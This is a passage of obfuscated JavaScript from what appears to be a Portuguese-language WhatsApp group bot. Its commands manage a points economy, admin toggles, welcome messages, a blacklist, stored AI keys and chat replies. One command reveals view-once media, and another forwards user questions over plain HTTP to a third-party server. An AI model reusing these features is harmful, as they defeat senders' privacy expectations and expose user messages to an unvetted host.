                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              var _0x86d5ea = rggold[_0x3befc0].usus;
              var _0x564bd1 = groupMembers.map(_0x431500 => _0x431500.id);
              _0x86d5ea = _0x86d5ea.filter(_0x8b6d4b => _0x564bd1.includes(_0x8b6d4b.id));
              _0x1564b4(rggold);
              galo = _0x86d5ea.map(_0x7278e3 => _0x7278e3);
              rank = galo.sort((_0x12849c, _0x185cd4) => _0x12849c.Golds < _0x185cd4.Golds ? 0 : -1);
              ment = [];
              ble = "💰         🪙 *RANK DE GOLDS* 🪙         💰\n" + lermais;
              for (_0x3194f3 = 0; _0x3194f3 < (_0x86d5ea.length < 10 ? _0x86d5ea.length : 10); _0x3194f3++) {
                if (_0x3194f3 != null) {
                  var _0x45fcf2 = _0x326cbd[0]?.["Chances"];
                  var _0x2fccc7 = _0x45fcf2[_0x45fcf2.findIndex(_0x59d25d => _0x59d25d.id === rank[_0x3194f3].id)];
                  var _0x3ea2b7 = rank[_0x3194f3]?.['id']?.["split"]('@')[0];
                  var _0x3c9b8b = _0x326cbd[0].Chances;
                  var _0xe774f6 = _0x3c9b8b[_0x3c9b8b.findIndex(_0x226fb8 => _0x226fb8.id === _0x3ea2b7)];
                  let _0x44ae40 = '';
                  _0x3c9b8b.forEach(_0x598a4c => {
                    if (JSON.stringify(_0x598a4c.ChanceR).includes(_0x3ea2b7)) {
                      _0x44ae40 += 1;
                    }
                  });
                  var _0xb423bf = _0x2fccc7?.["quiz"]?.["find"](_0x2982e0 => _0x2982e0)?.["errou"];
                  var _0x5b354e = _0x2fccc7?.["quiz"]?.["find"](_0x42bfcd => _0x42bfcd)?.["acertou"];
                  if (rank[_0x3194f3]?.['id']) {
                    ble += "\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗\n║ " + (_0x3194f3 + 1) + "º : @" + (rank[_0x3194f3]?.['id']?.["split"]('@')[0] || "Não foi possível solicitar.") + "\n║\n║ SALDO: " + (rank[_0x3194f3]?.["Golds"] || 0) + " GOLDS 🪙💰\n║\n║ QUANTAS VEZES ROUBOU HJ: " + (_0x2fccc7?.["ChanceR"]?.["length"] || 0) + "/5\n║ \n║ QUANTAS VEZES ROUBADO HJ: " + _0x44ae40.length + "\n║\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝\n";
                  }
                }
              }
              _0x5dcc57(ble);
              break;
            case "infogold":
            case "infogolds":
              {
                let _0x1cc134 = "Olá, os comandos de gold funcionam da seguinte maneira:\n\nPrimeiro comando, utilizado por algum adm, é configurar quais comandos do bot terá consumo de gold, comando: " + _0x141936 + "addcmdgold \n\nPara passar um comando a consumir gold, use: " + _0x141936 + "addcmdgold play/3\n\nEste foi um exemplo, porque o 3 é quanto de gold vai consumir após cada vez que for utilizado o play, pode ser qualquer comando.\n\nSegundo comando é pra remover o comando da lista de consumo de gold após ser usado, Exemplo: " + _0x141936 + "rmcmdgold play\n\nJá o terceiro comando é pra você adicionar ou tirar golds\n\nExemplo 1: " + _0x141936 + "addgold /5\n\nEu marquei a mensagem do usuário, usando este comando, e será concedido ao usuário 5 golds, a quantidade você escolhe.\n\nExemplo 2: " + _0x141936 + "tirargold @marcaalguem/5\n\nEste exemplo, você marca alguém do grupo que deseja mandar 5 golds, mas é um exemplo, você pode mandar quantos golds quiser.\n\n" + _0x141936 + "sorteiogold 10\n\nEste comando é parano bot sortear um aleatório do grupo e dar a quantidade de gold que você colocar.\n\nTudo alterado pelo adm do grupo, boa sorte.";
                _0x50740b(_0x1cc134);
              }
              break;
            case "addgold":
            case "tirargold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (!_0x5e13bf) {
                return _0x50740b("Você deve Marcar a mensagem do usuário com " + (_0x141936 + _0x267d4b) + " /100 por exemplo, ou " + (_0x141936 + _0x267d4b) + " @xpessoa/100, a quantidade é quanto quiser.");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var [_0x2eb410, _0x49253d] = _0x11e99e.trim().split('/');
              if (!_0x11e99e.trim().includes('/')) {
                return _0x50740b("Contém 2 fórmas, Exemplo1: " + (_0x141936 + _0x267d4b) + " /5\n\n O exemplo 1, você marca a mensagem do usuário, já o Exemplo2: " + (_0x141936 + _0x267d4b) + " @marca/5\n\nO exemplo 2, você marca ele no grupo com @/5 que é a quantidade de golds.");
              }
              if (_0x267d4b == "addgold") {
                _0x54f0dc(_0x33d21e, Number(_0x49253d), _0x5e13bf);
              } else {
                _0x727d62(_0x33d21e, Number(_0x49253d), _0x5e13bf);
              }
              break;
            case "sistemgold":
            case "systemgold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              _0x326cbd[0].sistemGold = !_0x326cbd[0].sistemGold;
              _0x137e44(_0x326cbd);
              _0x50740b(_0x326cbd[0]?.["sistemGold"] ? "Sistema de golds ativado com sucesso neste grupo." : "Sistema de golds desativado.");
              break;
            case "x9visuunica":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0xc01de) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].visuUnica = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de revelar visu única neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0xc01de) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].visuUnica = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de revelar visu única neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "so_adm":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x5bea47) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].soadm = true;
                _0x137e44(_0x326cbd);
                _0x50740b(" - Ativou com sucesso o recurso de só adm utilizar comandos neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x5bea47) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].soadm = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou o recurso de Só ADM utiliar comandos neste grupo ✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "odelete":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x1b869d) {
                  return _0x50740b("Ja esta ativo");
                }
                nescessario.Odelete = true;
                _0x13c255(nescessario);
                _0x50740b("🌀 Ativou com sucesso o recurso de delete nos grupos 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x1b869d) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  nescessario.Odelete = false;
                  _0x13c255(nescessario);
                  _0x50740b("‼️ Desativou com sucesso o recurso de delete nos grupos ✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "msgantilink":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x3431a7) {
                  return _0x50740b("Ja esta ativo");
                }
                nescessario.msgantilink = true;
                _0x13c255(nescessario);
                _0x50740b("🌀 Ativou com sucesso o recurso de msg no antilink deste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x3431a7) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  nescessario.msgantilink = false;
                  _0x13c255(nescessario);
                  _0x50740b("‼️ Desativou com sucesso o recurso de msg no antilink deste grupo ✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "baixaram":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (nescessario.ReiniciarBaixaRam === undefined || nescessario.ReiniciarBaixaRam === false) {
                nescessario.ReiniciarBaixaRam = true;
                _0x50740b("ReiniciarBaixaRam Ativado.");
              } else if (nescessario.ReiniciarBaixaRam === true) {
                nescessario.ReiniciarBaixaRam = false;
                _0x50740b("ReiniciarBaixaRam Desativado.");
              }
              _0x13c255(nescessario);
              break;
            case "antifake":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x2e49b2) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antifake = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de antifake neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x2e49b2) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antifake = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de antifake neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "prefixos":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (_0x326cbd[0].prefixos.length < 1) {
                return _0x50740b("Não contem nenhum prefixo a + adicionado neste grupo.");
              }
              _0xf9c182 = "Lista de prefixos para uso do bot, no Grupo: " + _0x3baffe + "\n\n";
              for (_0x3194f3 of _0x326cbd[0].prefixos) {
                _0xf9c182 += "Prefixo: " + _0x3194f3 + "\n\n";
              }
              _0x50740b(_0xf9c182);
              break;
            case "add_prefixo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x5adeef) {
                return _0x50740b("Para usar este comando, você deve ativar o comando, multiprefix\nExemplo: " + _0x141936 + "multiprefixo 1");
              }
              if (ANT_LTR_MD_EMJ(_0x11e99e)) {
                return _0x50740b("Não pode letra modificada, nem emoji..");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Determine o novo prefixo, não pode espaço vazio...");
              }
              if (_0x11e99e.trim() > 1) {
                return _0x50740b("Calma, o prefixo só pode ser um\nExemplo: " + (_0x141936 + _0x267d4b) + " _\nAe o bot vai passar á responder _ como prefixo do bot..");
              }
              if (_0x326cbd[0].prefixos.indexOf(_0x11e99e.trim()) >= 0) {
                return _0x50740b("Esse prefixo já se encontra incluso, procure ver na lista dos prefixos\nExemplo: " + _0x141936 + "prefixos");
              }
              _0x326cbd[0].prefixos.push(_0x11e99e.trim());
              _0x137e44(_0x326cbd);
              _0x50740b("Prefixo " + _0x11e99e.trim() + " Adicionado com sucesso na lista de prefixos para uso do bot, neste grupo...");
              break;
            case "tirar_prefixo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x5adeef) {
                return _0x50740b("Para usar este comando, você deve ativar o comando, multiprefix\nExemplo: " + _0x141936 + "multiprefixo 1");
              }
              if (ANT_LTR_MD_EMJ(_0x11e99e)) {
                return _0x50740b("Não pode letra modificada, nem emoji..");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Determine o prefixo que deseja tirar, não pode espaço vazio...");
              }
              if (_0x11e99e.trim() > 1) {
                return _0x50740b("Calma, o prefixo só pode ser tirado um por vez\nExemplo: " + (_0x141936 + _0x267d4b) + " _\nAe o bot não vai responder mais com _");
              }
              if (_0x326cbd[0].prefixos.indexOf(_0x11e99e.trim()) < 0) {
                return _0x50740b("Esse prefixo não está incluso, procure ver na lista dos prefixos\nExemplo: " + _0x141936 + "prefixos");
              }
              if (_0x326cbd[0].prefixos.length == 1) {
                return _0x50740b("Adicione um prefixo para pode tirar este, tem que ter pelo menos 1 prefixo já incluso dentro do sistema para tirar outro.");
              }
              _0x326cbd[0].prefixos.splice(_0x326cbd[0].prefixos.indexOf(_0x11e99e.trim()), 1);
              _0x137e44(_0x326cbd);
              _0x50740b("Prefixo " + _0x11e99e.trim() + " tirado com sucesso da lista de prefixos de uso deste grupo..");
              break;
            case "multiprefixo":
            case "multiprefix":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x5adeef) {
                _0x326cbd[0].multiprefix = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de multi prefixos neste grupo 📝");
              }
              if (_0x5adeef) {
                _0x326cbd[0].multiprefix = false;
                _0x137e44(_0x326cbd);
                _0x50740b("‼️ Desativou com sucesso o recurso de multi prefixos neste grupo✔️");
              }
              break;
            case "antinotas":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Hmmmm");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x51d731) {
                  return _0x50740b("Já Esta ativo");
                }
                _0x326cbd[0].antinotas = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti notas neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x51d731) {
                    return _0x50740b("Ja esta Desativado.");
                  }
                  _0x326cbd[0].antinotas = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativou com sucesso o recurso de anti notas neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "anticatalogo":
            case "anticatalg":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x52e919) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].anticatalogo = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de anticatalogo neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x52e919) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].anticatalogo = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de anticatalogo neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "bemvindo":
            case "welcome":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x21877a) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].wellcome[0].bemvindo1 = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de bem vindo neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x21877a) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].wellcome[0].bemvindo1 = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "bemvindo2":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Digite da forma correta:\nComando: " + (_0x141936 + _0x267d4b) + " 1 para ativar ");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x25178f) {
                  return _0x50740b("❎O recurso já está ativado no grupo❎");
                }
                _0x326cbd[0].wellcome[1].bemvindo2 = true;
                _0x137e44(_0x326cbd);
                _0x50740b("✅O recurso foi ativado✅");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x25178f) {
                    return _0x50740b("❎O recurso não está ativado no grupo❎");
                  }
                  _0x326cbd[0].wellcome[1].bemvindo2 = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("❌O recurso foi desativado❌");
                } else {
                  _0x50740b("Digite da forma correta:\nComando: " + (_0x141936 + _0x267d4b) + " 1, para ativar e 0 para desativar");
                }
              }
              break;
            case "legendabv":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de boas-vindas*");
              }
              teks = _0x3ac611.slice(11);
              if (_0x21877a) {
                _0x326cbd[0].wellcome[0].legendabv = teks;
                _0x137e44(_0x326cbd);
                _0x50740b("*Mensagem de boas vindas definida com sucesso!*");
              } else {
                _0x50740b("Ative o " + _0x141936 + "bemvindo 1");
              }
              break;
            case "legendasaiu":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de saída*");
              }
              teks = _0x3ac611.slice(13);
              if (_0x21877a) {
                _0x326cbd[0].wellcome[0].legendasaiu = teks;
                _0x137e44(_0x326cbd);
                _0x50740b("*Mensagem de saída definida com sucesso!*");
              } else {
                _0x50740b("Ative o " + _0x141936 + "bemvindo 1");
              }
              break;
            case "legendabv2":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de boas-vindas*");
              }
              teks = _0x3ac611.slice(12);
              if (_0x25178f) {
                _0x326cbd[0].wellcome[1].legendabv = teks;
                _0x137e44(_0x326cbd);
                _0x50740b("*Mensagem de boas vindas2 definida com sucesso!*");
              } else {
                _0x50740b("Ative o " + _0x141936 + "bemvindo2 1");
              }
              break;
            case "legendasaiu2":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de saída*");
              }
              teks = _0x3ac611.slice(14);
              if (_0x25178f) {
                _0x326cbd[0].wellcome[1].legendasaiu = teks;
                _0x137e44(_0x326cbd);
                _0x50740b("*Mensagem de saída2 definida com sucesso!*");
              } else {
                _0x50740b("Ative o " + _0x141936 + "bemvindo2 1");
              }
              break;
            case "legenda_estrangeiro":
            case "legenda_estrangeiros":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de remoção de estrangeiros*");
              }
              if (_0x2e49b2) {
                _0x326cbd[0].legenda_estrangeiro = _0x11e99e;
                _0x137e44(_0x326cbd);
                _0x50740b("*Mensagem de remoção de estrangeiros definida com sucesso!*");
              } else {
                _0x50740b("Ative o antifake primeiro com " + _0x141936 + "antifake 1");
              }
              break;
            case "legenda_video":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x326cbd[0].legenda_video = _0x11e99e;
              _0x137e44(_0x326cbd);
              _0x50740b("*Mensagem de remoção de video definida com sucesso!*");
              break;
            case "legenda_imagem":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x326cbd[0].legenda_imagem = _0x11e99e;
              _0x137e44(_0x326cbd);
              _0x50740b("*Mensagem de remoção de imagem definida com sucesso!*");
              break;
            case "legenda_documento":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("*Escreva a mensagem de remoção de estrangeiros*");
              }
              _0x326cbd[0].legenda_documento = _0x11e99e;
              _0x137e44(_0x326cbd);
              _0x50740b("*Mensagem de remoção de Documento definida com sucesso!*");
              break;
            case "autobang":
            case "listanegrag":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x44cf80) {
                return _0x50740b("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra Global..");
              }
              if (_0x40c021.includes(_0x44cf80)) {
                return _0x50740b("*Esse Número ja esta incluso*");
              }
              _0x40c021.push(_0x44cf80);
              fs.writeFileSync("./DADOS/nescessario.json", JSON.stringify(nescessario, null, "\t"));
              _0x50740b("*Número adicionado a lista de autoban*");
              break;
            case "tirardalistag":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x44cf80) {
                return _0x50740b("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..");
              }
              if (!_0x40c021.includes(_0x44cf80)) {
                return _0x50740b("*Esse Número não esta incluso*");
              }
              const _0x460cbd = _0x40c021.indexOf(_0x44cf80);
              _0x40c021.splice(_0x460cbd, 1);
              fs.writeFileSync("./DADOS/nescessario.json", JSON.stringify(nescessario, null, "\t"));
              _0x50740b("*Número foi removido da lista negra*");
              break;
            case "token_gpt":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.TOKEN_GPT = _0x11e99e.trim();
              _0x13c255(nescessario);
              _0x50740b("Token registrado com sucesso para o Chat Gpt, bom uso amigo(a)..");
              break;
            case "geminikey":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.geminikey = _0x11e99e.trim();
              _0x13c255(nescessario);
              _0x50740b("key registrado com sucesso para o gemini, bom uso amigo(a)..");
              break;
            case "crimg":
            case "superimg":
            case "imgcr":
              if (TOKEN_GPT === 0) {
                return _0x5dcc57("Olá @" + numerodono_ofc + " tá faltando o\ntoken do gpt, vai no site: https://platform.openai.com/account/api-keys gera a\nkey, ou manda alguma pessoa criar.. e usa o comando " + _0x141936 + "token_gpt e o token\naqui, boa sorte..");
              }
              try {
                _0x50740b("Realizando pedido..");
                const _0x59ca21 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': reqapi.superimg(_0x11e99e.trim(), nescessario.TOKEN_GPT)
                  }
                }, _0x59ca21)["catch"](() => {
                  return _0x50740b("Erro..");
                });
              } catch {
                return _0x50740b("Erro..");
              }
              break;
            case "pergunta":
            case "openai":
            case "gpt":
            case "chatgpt":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Faça uma pergunta, exemplo: " + (_0x141936 + _0x267d4b) + " Quantos anos para o plástico se decompor.");
                }
                _0x50740b("Aguarde, criando / pesquisando sobre o que esta perguntando ou pedindo.");
                let _0x83244e = await reqapi.gpt(_0x11e99e.trim(), nescessario.TOKEN_GPT);
                _0x50740b("( " + _0x83244e.msg + " )");
              } catch {
                _0x50740b("Erro..");
              }
              break;
            case "pergunta2":
            case "openai2":
            case "gpt2":
            case "chatgpt2":
              if (!_0x33286a && !_0x3f2f63) {
                return _0x50740b(enviar.msg.premium);
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Faça uma pergunta, exemplo: " + (_0x141936 + _0x267d4b) + " Quantos anos para o plástico se decompor.");
              }
              try {
                let _0x4fdbee = await fetch("http://api.baddeveloper.space:25572/api/newgpt?q=Sou Brasileiro:" + _0x11e99e);
                data23 = await _0x4fdbee.json();
                if (data23 && data23.msg) {
                  result23 = data23.msg;
                  code23 = data23.code;
                  _0x50740b("Resultado:" + result23 + " Código:" + code23);
                  console.log("Código:", code23);
                } else {
                  console.log("O objeto JSON ou a propriedade 'msg' não está definida.");
                }
              } catch (_0x183bb0) {
                console.log(_0x183bb0);
                _0x50740b("Ocorreu um erro na solicitação. Tente novamente mais tarde.");
              }
              break;
            case "simi":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              try {
                datasimi = await fetchJson("https://api.simsimi.vn/v1/simtalk", {
                  'method': "POST",
                  'headers': {
                    'content-type': "application/x-www-form-urlencoded"
                  },
                  'body': "text=" + _0x11e99e + "&lc=pt"
                });
                return _0x50740b(datasimi.message);
              } catch (_0x2b4282) {
                return _0x50740b("Resposta não encontrada..");
              }
              break;
            case "simih":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x785cbd) {
                  return _0x50740b("O modo Simi está ativo");
                }
                _0x326cbd[0].simi1 = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativado com sucesso o modo simi neste grupo 😗..");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x785cbd) {
                    return _0x50740b("Já está Desativado.");
                  }
                  _0x326cbd[0].simi1 = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativado modo simi com sucesso neste grupo 😡️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar, lerdao vc em KKKKK");
                }
              }
              break;
            case "simih2":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x2623e0) {
                  return _0x50740b("O modo Simi está ativo");
                }
                _0x326cbd[0].simi2 = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativado com sucesso o modo simi neste grupo 😗, Este simih2 ele aprende as respostas e perguntas das pessoas, conforme vai falando, por isso, só recomendo utilizar ele no termux, pois no site ou lugar diferente do termux que você utilizar, ele não vai armazenar os dados nescessarios");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x2623e0) {
                    return _0x50740b("Já está Desativado.");
                  }
